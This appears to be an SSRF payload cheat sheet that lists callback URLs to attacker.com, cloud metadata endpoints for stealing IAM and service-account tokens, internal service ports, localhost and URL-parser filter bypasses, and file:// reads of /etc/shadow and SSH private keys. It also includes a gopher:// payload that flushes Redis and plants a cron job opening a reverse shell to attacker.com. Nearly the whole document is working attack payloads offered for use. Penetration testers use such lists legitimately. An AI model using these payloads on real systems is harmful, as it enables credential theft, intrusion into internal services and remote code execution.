# SSRF Payloads

> SSRF lets you make the server send requests on your behalf — to internal services, cloud metadata, and beyond.
> Always confirm SSRF exists first with a simple HTTP callback to a server you control (Burp Collaborator, interactsh).

---

## Detecting SSRF

### Step 1: Callback Confirmation
Replace any URL parameter with a URL you control:
```
https://attacker.com/ssrf-test
http://your-interactsh-url.oast.me
http://your-burp-collaborator.burpcollaborator.net
```

### Step 2: Common SSRF Parameters
```
url=
redirect=
next=
target=
dest=
destination=
redir=
redirect_uri=
return=
return_url=
callback=
feed=
src=
source=
image=
img=
imageurl=
u=
link=
href=
action=
host=
endpoint=
proxy=
```

### Step 3: Protocol Handlers to Test
```
http://
https://
ftp://
file://
gopher://
dict://
sftp://
ldap://
ldaps://
tftp://
```

---

## Cloud Metadata Endpoints

### AWS IMDSv1 (No Token Required)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/api/token         ← IMDSv2 token request
```

### AWS IMDSv2 (Token Required — but check if v1 still enabled)
```
# First get token (check if target system can be forced to do this)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: [TOKEN]
```

### AWS ECS Metadata
```
http://169.254.170.2/v2/credentials/
http://169.254.170.2/v2/credentials/[container-id]
```

### GCP Metadata
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
```

### Azure Metadata
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean Metadata
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-id
http://169.254.169.254/metadata/v1/user-data
```

---

## Internal Service Discovery

### Common Internal Ports/Services
```
http://localhost:80/
http://127.0.0.1:80/
http://localhost:8080/
http://localhost:8443/
http://localhost:3000/           ← Node/Rails dev
http://localhost:5000/           ← Flask dev
http://localhost:9200/           ← Elasticsearch
http://localhost:6379/           ← Redis
http://localhost:5432/           ← PostgreSQL
http://localhost:3306/           ← MySQL
http://localhost:27017/          ← MongoDB
http://localhost:11211/          ← Memcached
http://localhost:4369/           ← RabbitMQ Erlang port mapper
http://localhost:15672/          ← RabbitMQ management UI
http://localhost:2375/           ← Docker API (unauthenticated)
http://localhost:2376/           ← Docker API (TLS)
http://localhost:10250/          ← Kubernetes kubelet
http://localhost:8001/           ← Kubernetes API proxy
http://localhost:2379/           ← etcd
http://localhost:2380/           ← etcd
http://localhost:4040/           ← ngrok
http://localhost:8500/           ← Consul
http://localhost:8200/           ← Vault
http://localhost:8080/manager/   ← Tomcat manager
http://localhost:4848/           ← GlassFish admin
http://localhost:7001/           ← WebLogic
```

### Docker/Container Specific
```
http://localhost:2375/version          ← Docker daemon info
http://localhost:2375/containers/json  ← List containers
http://localhost:2375/images/json      ← List images
```

### Kubernetes Specific
```
http://kubernetes.default.svc/api/v1/namespaces
http://kubernetes.default.svc/api/v1/secrets
http://10.0.0.1/api/v1/               ← k8s API server (common IP)
```

---

## Localhost Bypass Techniques

When `localhost` and `127.0.0.1` are blocked:

### Alternative Localhost Representations
```
http://0.0.0.0/
http://0/
http://127.1/
http://127.0.1/
http://0x7f000001/        ← hex
http://2130706433/        ← decimal
http://0177.0.0.1/        ← octal
http://[::1]/             ← IPv6 loopback
http://[::ffff:127.0.0.1]/
http://[0000::1]/
http://localhost.          ← trailing dot
http://LOCALHOST/          ← case variation
```

### DNS Rebinding / CNAME Tricks
```
http://localtest.me/          ← resolves to 127.0.0.1
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://spoofed.burpcollaborator.net/   ← check if resolves to 127.0.0.1
```

### URL Parser Confusion
```
http://attacker.com@127.0.0.1/          ← userinfo bypass
http://127.0.0.1#attacker.com/          ← fragment
http://127.0.0.1?.attacker.com/         ← query string
http://attacker.com\@127.0.0.1/         ← backslash
http://attacker.com%2540127.0.0.1/      ← URL encoded @
```

### Redirect Chains
If the server follows redirects:
```
# Host a redirect at attacker.com that 302s to internal target
Location: http://169.254.169.254/latest/meta-data/
Location: http://localhost:8080/admin
```

---

## Protocol-Specific Attacks

### file:// — Local File Read
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/net/tcp
file:///var/www/html/config.php
file:///home/ubuntu/.ssh/id_rsa
file://C:/Windows/win.ini
file://C:/inetpub/wwwroot/web.config
```

### gopher:// — Raw TCP (Port Scanning + Service Exploitation)
```
# HTTP request via gopher
gopher://localhost:80/_GET / HTTP/1.0%0d%0a%0d%0a

# Redis via gopher (flush + add cron job for RCE)
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# SMTP via gopher (send email as internal server)
gopher://localhost:25/_EHLO%20localhost
```

### dict:// — Dictionary Protocol
```
dict://localhost:6379/info          ← Redis info
dict://localhost:11211/stats        ← Memcached stats
```

---

## SSRF Filter Bypass Cheatsheet

| Blocked | Try Instead |
|---|---|
| `localhost` | `127.0.0.1`, `0.0.0.0`, `[::1]`, `0x7f000001`, `2130706433` |
| `127.0.0.1` | `localhost`, `127.1`, `127.0.1`, `0177.0.0.1` |
| `169.254.169.254` | `169.254.169.254.nip.io`, decimal: `2852039166` |
| `http://` | `HTTP://`, `https://`, redirect from allowed host |
| IP ranges blocked | DNS to internal IP via CNAME, DNS rebinding |
| Port blocked | Try common service on other ports, protocol smuggling |
